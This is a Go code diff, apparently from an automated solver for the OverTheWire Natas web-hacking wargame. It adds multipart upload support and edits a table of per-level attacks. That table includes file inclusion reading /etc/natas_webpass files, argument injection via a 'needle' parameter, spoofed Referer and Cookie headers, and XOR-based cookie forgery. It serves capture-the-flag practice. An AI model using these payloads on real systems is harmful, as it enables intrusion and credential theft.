@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"mime/multipart"
 	"net/http"
 	"net/url"
 	"strings"
@@ -72,17 +73,36 @@ func (h Headers) Grab(r http.Request) string {
 type Post struct {
 	Grabber
 	Data SetData
+	File *File
+}
+
+type File struct {
+	Field, Name string
+	memio.Buffer
+}
+
+type MPSetter struct {
+	*multipart.Writer
+}
+
+func (m MPSetter) Set(key, value string) {
+	e(m.WriteField(key, value))
 }
 
 func (p Post) Grab(r http.Request) string {
-	values := make(url.Values, len(p.Data))
-	p.Data.Set(r, values)
-	m := memio.Buffer(values.Encode())
-	r.Body = &m
+	var b memio.Buffer
+	m := multipart.NewWriter(&b)
+	p.Data.Set(r, MPSetter{m})
+	if p.File != nil {
+		rw, err := m.CreateFormFile(p.File.Field, p.File.Name)
+		e(err)
+		io.Copy(rw, p.File)
+	}
+	e(m.Close())
+	r.Body = &b
 	r.Method = http.MethodPost
-	r.ContentLength = int64(len(m))
-	h := Headers{p.Grabber, map[string]Grabber{"Content-Type": Text{"application/x-www-form-urlencoded"}}}
-	return h.Grab(r)
+	r.ContentLength = int64(len(b))
+	return Headers{p.Grabber, map[string]Grabber{"Content-Type": Text{m.FormDataContentType()}}}.Grab(r)
 }
 
 type Get struct {
@@ -227,9 +247,9 @@ var levels = [...]Grabber{
 	Path{Prefixed{"natas4:", 32}, Text{"/s3cr3t/users.txt"}}, // robots.txt references /s3cr3t/, find users.txt
 	Headers{Prefixed{"The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
 	Headers{Prefixed{"The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
-	Post{Prefixed{"The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{"$secret = \"", 19}, Text{"/includes/secret.inc"}}}},
+	Post{Prefixed{"The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{"$secret = \"", 19}, Text{"/includes/secret.inc"}}}, nil},
 	Get{Prefixed{"<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
-	Post{Prefixed{"The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, Text{"/index-source.html"}}}}}}},
+	Post{Prefixed{"The password for natas9 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Base64Decode{Reverse{Hex2Dec{Path{Prefixed{"$encodedSecret&nbsp;=&nbsp;\"", 32}, Text{"/index-source.html"}}}}}}, nil},
 	Get{Prefixed{"/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
 	Get{Prefixed{"/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
 	Headers{Prefixed{"The password for natas12 is ", 32}, SetData{"Cookie": Combine{Text{"data="}, Base64Encode{XOR{Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"}, FindRepeating{XOR{Base64Decode{Cookie{"data"}}, Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"}}}}}}}},
